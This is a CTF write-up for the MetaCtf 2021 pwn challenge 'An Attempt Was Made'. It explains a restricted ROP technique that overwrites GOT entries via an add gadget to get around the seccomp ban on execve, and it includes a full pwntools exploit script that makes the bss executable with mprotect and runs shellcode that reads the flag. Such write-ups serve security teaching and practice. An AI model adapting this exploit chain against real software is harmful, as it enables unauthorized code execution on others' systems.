# An Attempt Was Made

was a pwn challenge from MetaCtf 2021.

A kind of restricted ROP. I got first blood on it, and it was pretty fun..

is has a little seccomp to forbid execve, as you can see:

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/MetaCtf.2021/pwn/A.Attempt.Was.Made/pics/seccomp.png)

the binary itself as little protection, it is only partial RELRO, and no PIE

![](https://raw.githubusercontent.com/nobodyisnobody/write-ups/main/MetaCtf.2021/pwn/A.Attempt.Was.Made/pics/checksec.png)

the author of the challenge removed the libcsu_init gadgets, that ease the settings of rdi, rsi, rdx..

and very little usefull gadgets are available to set the registers...but..

the almost available add gadget (at least for gcc x64 produced binaries)  is present, with a gadget for setting rbp and rbx..

```
gadget_add = 0x0000000000401178 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
gadget_pop = 0x00000000004013f2 # pop rbx ; pop rbp ; mov r12, qword ptr [rsp] ; add rsp, 8 ; ret
```

and with partial RELRO it's more than enough for us..

so for exploitation, we will change GOT entries with the add gadget, to make them point to various gadgets we need in libc..

as the libc is provided, we know the various offsets from functions addresses in GOT to the gadgets..

one time we change a got entry to make it point to a "pop rdi" gadget

the next time, to a "pop rdx",  etc...

you got the idea...

then with the ROP, we do a mprotect on bss to make it RWX..

we call a read, to copy our shellcode to the bss..

then we execute it...

and that's all..  here is the exploit...

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

gadget_add = 0x0000000000401178 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
gadget_pop = 0x00000000004013f2 # pop rbx ; pop rbp ; mov r12, qword ptr [rsp] ; add rsp, 8 ; ret

def add_gadget(address, val):
  global gadget_add
  global gadget_pop
  return p64(gadget_pop)+p64(val & 0xffffffff)+p64(address+0x3d)+p64(0)+p64(gadget_add)

exe = ELF('./chall')
libc = ELF('./libc.so.6')
rop = ROP(exe)

host, port = "host.cg21.metaproblems.com", "3030"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)


pop_rbp = 0x0000000000401179 # pop rbp ; ret

# libc gadgets
gadget3 = 0x000000000008ff1d # pop rdi ; ret
gadget4 = 0x000000000008ef1b # pop rdx ; ret
gadget5 = 0x0000000000066337 # or esi, edx; movd xmm0, esi; ret;
gadget6 = 0x000000000004f549 # xchg eax, esi; ret;
gadget7 = 0x000000000006991a # mov rax, rbp; pop rbp; ret;
gadget8 = 0x000000000009cfc2 # syscall; ret;

payload = 'A'*0x10+p64(gadget3-libc.symbols['__isoc99_scanf'])+p64(0xdeadcafe)+p64(0xcafebabe)+p64(pop_rbp)+p64(exe.got['__isoc99_scanf']+0x3d)+p64(gadget_add)	# change __isoc99_scanf to gadget3

payload += add_gadget(exe.got['setvbuf'], (gadget7-libc.symbols['setvbuf']))	# change setvbuf to gadget7
payload += p64(pop_rbp)+p64(0x1000)				# set rbp=0x1000
payload += p64(exe.symbols['setvbuf'])+p64(0) 			# set rax = rbp
payload += add_gadget(exe.got['setvbuf'], (gadget6-gadget7))    # change setvbuf to gadget6
payload += p64(exe.symbols['setvbuf'])				# set esi = eax = 0x1000

payload += add_gadget(exe.got['setvbuf'], (gadget4-gadget6))			# change setvbuf to gadget4
payload += p64(exe.symbols['__isoc99_scanf'])+p64(0x404000)+p64(exe.symbols['setvbuf'])+p64(7)		# set rdi = 0x404000 ,  then  set rdx = 7

payload += add_gadget(exe.got['__isoc99_scanf'], (gadget7-gadget3))		# change __isoc99_scanf to gadget7
payload += p64(pop_rbp)+p64(10)+p64(exe.symbols['__isoc99_scanf']) +p64(0)	# set rbp=10  then rax=rbp

payload += add_gadget(exe.got['__isoc99_scanf'], (gadget8-gadget7))		# change __isoc99_scanf to gadget8
payload += p64(exe.symbols['__isoc99_scanf'])  					# syscall  --> mprotect(0x404000, 0x1000, 7)    -->   set bss to RWX

payload += add_gadget(exe.got['__isoc99_scanf'], (gadget3-gadget8))             # change __isoc99_scanf to gadget3
payload += p64(exe.symbols['__isoc99_scanf']) + p64(0)		# set rdi = 0

payload += add_gadget(exe.got['__isoc99_scanf'], (gadget7-gadget3))             	# change __isoc99_scanf to gadget7
payload += p64(pop_rbp)+p64(0x404800)+p64(exe.symbols['__isoc99_scanf']) + p64(0)	# set rbp = 0x404800, then rax = rbp

payload += add_gadget(exe.got['__isoc99_scanf'], (gadget6-gadget7))                     # change __isoc99_scanf to gadget6
payload += p64(exe.symbols['__isoc99_scanf'])						# set rsi = 0x404800

payload += add_gadget(exe.got['__isoc99_scanf'], (gadget4-gadget6))			# change __isoc99_scanf to gadget4
payload += p64(exe.symbols['__isoc99_scanf']) + p64(0x100)				# set rdx = 0x100

payload += add_gadget(exe.got['__isoc99_scanf'], (gadget7-gadget4))                     # change __isoc99_scanf to gadget7
payload += p64(pop_rbp)+p64(0)+p64(exe.symbols['__isoc99_scanf']) + p64(0)		# set rbp = 0 ,  then rax = rbp


payload += add_gadget(exe.got['__isoc99_scanf'], (gadget8-gadget7))                     # change __isoc99_scanf to gadget8
payload += p64(exe.symbols['__isoc99_scanf'])				#  syscall -->  read(0, 0x404800, 0x100)
payload += p64(0x404800)						# jump to our shellcode



p.sendlineafter('bytes?\n', str(len(payload)))

p.send(payload)

# send our shellcode to the ROP, dump flag.txt
shellc = asm(shellcraft.readfile('/chall/flag.txt',1))
p.send(shellc)

p.interactive()


```
*nobodyisnobody still pwning things...*

